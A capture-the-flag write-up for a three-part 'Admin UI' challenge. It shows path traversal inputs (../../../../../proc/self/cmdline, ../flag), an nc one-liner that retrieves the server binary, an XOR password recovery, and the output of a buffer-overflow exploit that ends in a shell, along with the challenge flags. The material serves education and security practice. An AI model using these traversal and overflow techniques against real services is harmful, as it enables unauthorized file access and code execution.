# Admin UI

> https://ctftime.org/writeup/10289

When we examine patchnotes we can find out that although path traversal vulnerability was patched in v0.2 it was rolled back in v0.3.
Let's try it
```
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.3
 - Version0.2
Which patchnotes should be shown?
../../../../../proc/self/cmdline
./main
```
So our binary is named `main`. Hopefully we can just print its contents the same way.
```
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.3
 - Version0.2
Which patchnotes should be shown?
../main
```
We have to redirect output to file and then remove additional data added by this application (menu etc.)
```
printf "2\n../main\n3\n" | nc mngmnt-iface.ctfcompetition.com 1337 > output.bin
```
(open output.bin in any notepad or hexeditor and remove everything before \x7fELF and after the last series of null bytes at the end)
This way we got the copy of the binary running on the server.
When we open it in IDA we can see that the application reads the password from file `flag`. Let's cat it.
```
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.3
 - Version0.2
Which patchnotes should be shown?
../flag
CTF{I_luv_buggy_sOFtware}
```
Flag: `CTF{I_luv_buggy_sOFtware}`

# Admin UI 2

> https://ctftime.org/writeup/10288

When we enter the flag from previous level as the password we can see that it's not the end and we have to enter secondary password.
When we analyze it in IDA, we can notice that it only checks if the password has 35 characters (maybe it wasn't intended by creators of this challenge).
Anyway we can the second flag offline. There is `_ZL4FLAG` offset in IDA and it's `const unsigned __int8 FLAG[35]`.
We can also notice that before length check our password is xorred with 0xC7 byte. So maybe if we just xor the flag from memory with this byte we'd get the flag back?
This [script](2nd.py) does it for us.

Flag: `CTF{Two_PasSworDz_Better_th4n_1_k?}`

# Admin UI 3

> https://ctftime.org/writeup/10287

The last part of the series and the most interesting one. We finally get to command execution. Unfortunately there is variable `_ZL13shell_enabled` and it's set to false.
But we can execute some built-in commands. `debug` command prints us a lot of interesing informations about the memory. The most important is `_ZL13cmds_executed` variable and its address. `shell_enabled` is just after it in the memory!
Also there is `echo` command which calls printf with our input as first parameter. This would allow us to perform format string attack.
But there's an easier solution. ASLR is disabled for this binary, so addresses are constant and we don't need to print them at all (we can get it with IDA).
The second vulnerability is buffer overflow. If we send 0x38 times any letter and after that an address of the debug_shell() call (the if branch that would be executed if shell_enabled variable were set to true) the application will return to that address.
[exploit](exploit.py)
When you run the exploit you have to type `quit` twice. And then you have the shell.
```
$ ./exploit.py
[+] Opening connection to mngmnt-iface.ctfcompetition.com on port 1337: Done
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1

Please enter the backdoo^Wservice password
CTF{I_luv_buggy_sOFtware}
:
! Two factor authentication required !
Please enter secret secondary password
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
:
Authenticated
[*] Switching to interactive mode

> Unknown command ''
> Unknown command 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAICAA'
> Bye!
$ ls -la
total 144
drwxr-xr-x 3 user   user      4096 Jun 18 08:25 .
drwxr-xr-x 3 nobody nogroup   4096 May 25 13:19 ..
-rw-r--r-- 1 user   user       220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 user   user      3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 user   user       655 May 16  2017 .profile
-rw-r--r-- 1 nobody nogroup     26 May 24 15:03 an0th3r_fl44444g_yo
-rw-r--r-- 1 nobody nogroup     25 Jun 18 08:25 flag
-rwxr-xr-x 1 nobody nogroup 111128 Jun 18 08:25 main
drwxr-xr-x 2 nobody nogroup   4096 Jun 18 08:25 patchnotes
$ cat an0th3r_fl44444g_yo
CTF{c0d3ExEc?W411_pL4y3d}
```

Flag: `CTF{c0d3ExEc?W411_pL4y3d}`
